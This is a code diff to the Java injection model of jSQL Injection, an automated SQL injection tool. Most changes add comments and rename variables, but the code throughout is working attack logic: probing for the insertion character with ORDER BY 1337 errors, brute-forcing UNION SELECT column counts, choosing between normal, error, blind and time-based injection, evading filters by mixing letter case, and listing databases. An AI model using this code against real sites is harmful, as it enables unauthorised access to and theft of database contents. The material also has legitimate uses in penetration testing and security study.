@@ -38,8 +38,8 @@ import mvc.model.database.Table;
 
 import tool.StringTool;
 
-/*
- * Model for injection, linked to views by MVC compound pattern
+/**
+ * Define the Model in charge of injection, MVC functionalities are provided by ModelObservable
  */
 public class InjectionModel extends ModelObservable { 
 
@@ -49,7 +49,7 @@ public class InjectionModel extends ModelObservable {
 	insertionCharacter, // i.e, -1 in "[...].php?id=-1 union select[...]"
 firstSuccessPageSource,
 			initialUrl, // url entered by user
-		  visibleIndex, // i.e, 2 in "[...]union select 1,2,[...]", if 2 is matched in HTML source
+		  visibleIndex, // i.e, 2 in "[...]union select 1,2,[...]", if 2 is found in HTML source
 		  initialQuery, // initialUrl build with index
 	
 		  	    method, // GET, POST, COOKIE, HEADER (State/Strategy pattern)
@@ -69,27 +69,32 @@ firstSuccessPageSource,
 
 	public boolean isProxyfied = false,
 					
-			  isNormalInjectable = false, // State/Strategy pattern
-		   isErrorBasedInjectable = false,
+			  isNormalInjectable = false, // State/Strategy pattern here?
+		  isErrorBasedInjectable = false,
 		   isTimeBasedInjectable = false,
 		       isBlindInjectable = false,
 
 		  useErrorBasedInjection = false,
-			      useBlindInjection = false,
-					      useTimeBasedInjection = false;
+			   useBlindInjection = false,
+		   useTimeBasedInjection = false,
 
-	public boolean isInjectionBuilt = false;
+		   		isInjectionBuilt = false; 	// allow to directly start an injection after a failed one
+											// without asking the user 'Start a new injection?'
 	
-	private BlindInjection blindModel;
-	private TimeInjection timeModel;
+	private BlindInjection blindModel; 	// blind injection is processed by a separated class
+	private TimeInjection timeModel;	// time based injection is processed by a separated class
 	
 	public InjectionModel(){
 		this.sendMessage("-- jSQL Injection "+ jSQLVersion +" --");
 	}
 	
-	public int etape = 0;
+	public int securitySteps = 0;	// current evasion degree, 0 is 'no evasion'
 
+	/**
+	 * Prepares the injection process, can be interrupted by the user (via stopFlag)
+	 */
 	public void inputValidation(){
+		// Erase all attributes eventually defined in a previous injection,
 			insertionCharacter = 
 				  visibleIndex =
 				  initialQuery =
@@ -116,6 +121,7 @@ firstSuccessPageSource,
 					 timeModel = null;
 		
 		try{
+			// Test if proxy is available and applies its parameters 
 			if(isProxyfied && !proxyAdress.equals("") && !proxyPort.equals("")){
 				try {
 				  	new Socket(proxyAdress, Integer.parseInt(proxyPort)).close();
@@ -127,6 +133,7 @@ firstSuccessPageSource,
 				System.setProperty("http.proxyPort", proxyPort);
 			}
 	
+			// test the connection
 			try {
 				this.sendMessage("*** Starting new injection\nConnection test...");
 				
@@ -141,10 +148,11 @@ firstSuccessPageSource,
 				throw new PreparationException("Connection problem: " + e.getMessage());
 			}
 			
-			// Design Pattern: State
+			// define insertionCharacter, i.e, -1 in "[...].php?id=-1 union select[...]",
 			this.sendMessage("Get insertion character...");
 			this.insertionCharacter = new Stoppable_getInsertionCharacter(this).begin();
 			
+			// test each injection methods: time, blind, error, normal
 			this.sendMessage("Time based test...");
 			this.isTimeBasedInjectable = this.isTimeBasedInjectable();
 			if(this.isTimeBasedInjectable)
@@ -164,7 +172,8 @@ firstSuccessPageSource,
 			this.initialQuery = new Stoppable_getInitialQuery(this).begin();
 			this.isNormalInjectable = !this.initialQuery.equals("");
 			
-			// State
+			// Choose the most efficient method: normal > error > blind > time
+			// State pattern?
 			if( !this.isNormalInjectable ){
 				if(this.isErrorBasedInjectable/* && etape==2*/){
 					this.sendMessage("Using error based injection...");
@@ -178,9 +187,10 @@ firstSuccessPageSource,
 					this.useTimeBasedInjection = true;
 					new GUIThread("binary-message","Each request will ask \"Is the bit is true?\", and a true response must not exceed 5 seconds.\n").run();
 				}else{
-					etape++;
-					if(etape<=2){
-						this.sendMessage("Injection not possible, testing evasion n°"+etape+"...");
+					// No injection possible, increase evasion degree and restart whole process
+					securitySteps++;
+					if(securitySteps<=2){
+						this.sendMessage("Injection not possible, testing evasion n°"+securitySteps+"...");
 						getData += insertionCharacter; // sinon perte de insertionCharacter entre 2 injections
 						inputValidation();
 						return;
@@ -191,11 +201,13 @@ firstSuccessPageSource,
 				this.sendMessage("Using normal injection...");
 				new GUIThread("add-normal").run();
 				try{
+					// define visibleIndex, i.e, 2 in "[...]union select 1,2,[...]", if 2 is found in HTML source
 					this.visibleIndex = this.getVisibleIndex(this.firstSuccessPageSource);
-				}catch(ArrayIndexOutOfBoundsException e){
-					etape++;
-					if(etape<=2){
-						this.sendMessage("Injection not possible, testing evasion n°"+etape+"...");
+				}catch(ArrayIndexOutOfBoundsException e){ 
+					// rare situation where injection fails after being validated, try with some evasion
+					securitySteps++;
+					if(securitySteps<=2){
+						this.sendMessage("Injection not possible, testing evasion n°"+securitySteps+"...");
 						getData += insertionCharacter; // sinon perte de insertionCharacter entre 2 injections
 						inputValidation();
 						return;
@@ -205,12 +217,15 @@ firstSuccessPageSource,
 			}
 			
 			this.sendMessage("Fetching informations...");
+			// Get the first informations from database
 			this.getDBInfos();
 			
+			// Stop injection if database is too old
 			if(versionDB.startsWith("4")||versionDB.startsWith("3"))
 				throw new PreparationException("Old database, automatic search is not possible");	 
 			
 			this.sendMessage("Fetching databases...");
+			// Get the databases
 			this.listDatabases();
 			this.sendMessage("Done.");
 			
@@ -224,6 +239,12 @@ firstSuccessPageSource,
 		}
 	}
 	
+	/**
+	 * Runnable class defines the insertionCharacter that will be used by all futures requests,
+	 * i.e -1 in "[...].php?id=-1 union select[...]", sometimes it's -1, 0', 0, etc,
+	 * this class/function tries to find the working one by searching a special error message
+	 * in the source page
+	 */
 	private class Stoppable_getInsertionCharacter extends Stoppable{
 		public Stoppable_getInsertionCharacter(InjectionModel model) {
 			super(model);
@@ -231,10 +252,14 @@ firstSuccessPageSource,
 
 		@Override
 		public String action(Object... args) throws PreparationException, StoppableException {
+			// Has the url a query string?
 			if( model.method.equals("GET") && (model.getData == null || model.getData.equals("")) ){
 				throw new PreparationException("No query string");
+			// Is the query string well formed?
 			}else if( model.method.equals("GET") && model.getData.matches("[^\\w]*=.*") ){
 				throw new PreparationException("Bad query string for injection");
+			// Extract the query information: first, everything before the sign '=', 
+			// second, the rest
 			}else if( model.method.equals("GET") && !model.getData.matches(".*=$") ){ 
 		    	Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(model.getData);
 				regexSearch.find();
@@ -244,6 +269,8 @@ firstSuccessPageSource,
 				}catch(IllegalStateException e){
 					throw new PreparationException("Incorrect GET format");
 				}
+			// Extract the post information: first, everything before the sign '=', 
+			// second, the rest
 		    }else if( model.method.equals("POST") && !model.postData.matches(".*=$") ){ 
 		    	Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(model.postData);
 				regexSearch.find();
@@ -253,6 +280,8 @@ firstSuccessPageSource,
 				}catch(IllegalStateException e){
 					throw new PreparationException("incorrect POST format");
 				}
+			// Extract the cookie information: first, everything before the sign '=', 
+			// second, the rest
 		    }else if( model.method.equals("COOKIE") && !model.cookieData.matches(".*=$") ){ 
 		    	Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(model.cookieData);
 				regexSearch.find();
@@ -262,6 +291,8 @@ firstSuccessPageSource,
 				}catch(IllegalStateException e){
 					throw new PreparationException("incorrect Cookie format");
 				}
+			// Extract the header information: first, everything before the sign ':', 
+			// second, the rest
 		    }else if( model.method.equals("HEADER") && !model.headerData.matches(".*:$") ){ 
 		    	Matcher regexSearch = Pattern.compile("(.*:)(.*)").matcher(model.headerData);
 				regexSearch.find();
@@ -273,6 +304,11 @@ firstSuccessPageSource,
 				}
 		    }
 			
+			// We parallelize the search and let the user stops the process if wanted
+			// SQL: we force a wrong ORDER BY clause with an inexistent column, order by 1337,
+			// and check if a correct error message is sent back by the server:
+			// 		Unknown column '1337' in 'order clause'
+			// or   supplied argument is not a valid MySQL result resource
 			ExecutorService taskExecutor = Executors.newCachedThreadPool();
 	        CompletionService<MyCallable> taskCompletionService = new ExecutorCompletionService<MyCallable>(taskExecutor);
 	        for( String insertionCharacter : new String[] {"0","0'","'","-1","1","\"","-1)"} )
@@ -281,6 +317,7 @@ firstSuccessPageSource,
 	        int total=7;
 	        while(0<total){
 //	        	try { System.out.println("Stoppable_getInsertionCharacter"); Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); }
+	        	// Break the loop if the user wants
 	        	if(isPreparationStopped()) throw new StoppableException();
 	        	try {
 					MyCallable currentCallable = taskCompletionService.take().get();
@@ -288,7 +325,7 @@ firstSuccessPageSource,
 					String pageSource = currentCallable.content;
 					if(Pattern.compile(".*Unknown column '1337' in 'order clause'.*", Pattern.DOTALL).matcher(pageSource).matches() || 
 						Pattern.compile(".*supplied argument is not a valid MySQL result resource.*", Pattern.DOTALL).matcher(pageSource).matches()){
-						return currentCallable.tag;
+						return currentCallable.tag; // the correct character
 					}
 				} catch (InterruptedException e) {
 					e.printStackTrace();
@@ -297,10 +334,15 @@ firstSuccessPageSource,
 				}
 	        }
 	        
+	        // Nothing seems to work, forces 1 has the character
 			return "1";
 		}
 	}
 
+	/**
+	 * Runnable class searches the correct number of fields in the SQL query,
+	 * parallelizes the search, provides the stop capability
+	 */
 	private class Stoppable_getInitialQuery extends Stoppable{
 		public Stoppable_getInitialQuery(InjectionModel model) {
 			super(model);
@@ -308,31 +350,37 @@ firstSuccessPageSource,
 		
 		@Override
 		public String action(Object... args) throws PreparationException, StoppableException {
+			// We parallelize the search
 			ExecutorService taskExecutor = Executors.newCachedThreadPool();
 	        CompletionService<MyCallable> taskCompletionService = new ExecutorCompletionService<MyCallable>(taskExecutor);
 
-	        boolean trouve = false;
+	        boolean requestFound = false;
 	        String selectFields, initialQuery="";
 			int selectIndex;
+			
+			// SQL: each field is built has the following 1337[index]7330+1
+			// We will search if the source contains 1337[index]7331, that notation allows to exclude
+			// pages that display our own url as a correct mark
 	        for(selectIndex=1, selectFields="133717330%2b1"; selectIndex<=10 ;selectIndex++, selectFields += ",1337"+selectIndex+"7330%2b1")
 	        	taskCompletionService.submit(new MyCallable(insertionCharacter + "+union+select+" + selectFields + "--+"));
 	        	
 	        int total=10;
 	        
 			try {
-				while( !trouve && total<99 ){
+				// Starting with 10 requests, to 100
+				while( !requestFound && total<99 ){
 //					try { System.out.println("Stoppable_getInitialQuery " + selectIndex); Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); }
+					// Breaks the loop if the user wants
 					if(isPreparationStopped()) throw new StoppableException();
 	
 					MyCallable currentCallable = taskCompletionService.take().get();
-//		        	System.out.println(new Date() + " - " + currentCallable.url);
-		        	if(Pattern.compile(".*1337\\d+7331.*", Pattern.DOTALL).matcher(currentCallable.content).matches()){
+		        	// We found a corresponding mark
+					if(Pattern.compile(".*1337\\d+7331.*", Pattern.DOTALL).matcher(currentCallable.content).matches()){
 		        		model.firstSuccessPageSource = currentCallable.content;
 		        		initialQuery = currentCallable.url.replaceAll("0%2b1","1");
-//		        		System.out.println("résultat: "+initialQuery);
-		        		trouve = true;
-	//		        		break;
-		        	}else{
+		        		requestFound = true;
+		        	// Else we add a new index
+					}else{
 		        		selectIndex++;
 		        		selectFields += ",1337"+selectIndex+"7330%2b1";
 		    	        taskCompletionService.submit(new MyCallable(insertionCharacter + "+union+select+" + selectFields + "--+"));
@@ -347,13 +395,19 @@ firstSuccessPageSource,
 				e.printStackTrace();
 			}
 
-	        if(trouve)
+	        if(requestFound)
 	        	return initialQuery.replaceAll("\\+\\+union\\+select\\+.*?--\\+$","+");
 			return "";
 		}
 	}
 
+	/**
+	 * Runnable class searches the most efficient index,
+	 * some index will display lots of characters, others won't, so we sort them 
+	 * by order of efficiency: which one display the most characters?
+	 */	
 	private String getVisibleIndex(String firstSuccessPageSource) {		
+		// List all found index
 		Matcher regexSearch = Pattern.compile("1337(\\d+?)7331", Pattern.DOTALL).matcher(firstSuccessPageSource);
 		ArrayList<String> foundIndexes = new ArrayList<String>(); 
 		while(regexSearch.find()) 
@@ -361,10 +415,15 @@ firstSuccessPageSource,
 		
 		String[] indexes = foundIndexes.toArray(new String[foundIndexes.size()]);
 		
+		// Make url shorter, replace useless indexes from 1337[index]7331 to 1
 		this.initialQuery = this.initialQuery.replaceAll("1337(?!"+ StringTool.join(indexes,"|") +"7331)\\d*7331","1");
 		if(indexes.length == 1) 
 			return indexes[0];
 		
+		// Replace correct indexes from 1337[index]7331 to 
+		//     (select concat('SQLi',[index],repeat('#',1024),'iLQS'))
+		// ==> SQLi[index]######...######iLQS
+		// We will search which index displays the most #
 		String performanceQuery = 
 				this.initialQuery.replaceAll(
 					"1337("+ StringTool.join(indexes,"|") +")7331",
@@ -372,19 +431,27 @@ firstSuccessPageSource,
 				);
 		
 		String performanceSourcePage = this.inject(performanceQuery);
+		
+		// Build a 2D array of string with:
+		//     column 1: index
+		// 	   column 2: corresponding # found, so #######...#######
 		regexSearch = Pattern.compile("SQLi(\\d+)(#*)", Pattern.DOTALL).matcher(performanceSourcePage);
 		ArrayList<String[]> performanceResults = new ArrayList<String[]>();
 		while(regexSearch.find()) 
 			performanceResults.add( new String[]{regexSearch.group(1),regexSearch.group(2)} ); 
 		
+		// Switch from previous array to 2D integer array
+		//     column 1: length of #######...#######
+		// 	   column 2: index
 		Integer[][] lengthFields = new Integer[performanceResults.size()][2];
-		for(int i=0; i < performanceResults.size() ;i++) //# Vérifie quel est l'index qui renvoie le plus de données
+		for(int i=0; i < performanceResults.size() ;i++)
 			lengthFields[i] = 
 					new Integer[]{ 
 						performanceResults.get(i)[1].length(), 
 						Integer.parseInt(performanceResults.get(i)[0]) 
 					};
 		
+		// Sort by length of #######...#######
 		Arrays.sort(lengthFields, new Comparator<Integer[]>() {
 		    @Override
 		    public int compare(Integer[] s1, Integer[] s2) {
@@ -394,6 +461,7 @@ firstSuccessPageSource,
 		    }
 		});
 	
+		// Replace all other index to 1
 		this.initialQuery = 
 				this.initialQuery.replaceAll(
 					"1337(?!"+ lengthFields[lengthFields.length-1][1] +"7331)\\d*7331",
@@ -945,7 +1013,7 @@ firstSuccessPageSource,
 		if(this.getData != null && !this.getData.equals("")){
 			urlUltimate += this.buildQuery("GET", getData, useVisibleIndex, dataInjection);
 			try {
-				switch(etape){
+				switch(securitySteps){
 				case 1: urlUltimate = urlUltimate
 						.replaceAll("union\\+", "uNiOn+")
 						.replaceAll("select\\+", "sElEcT+")
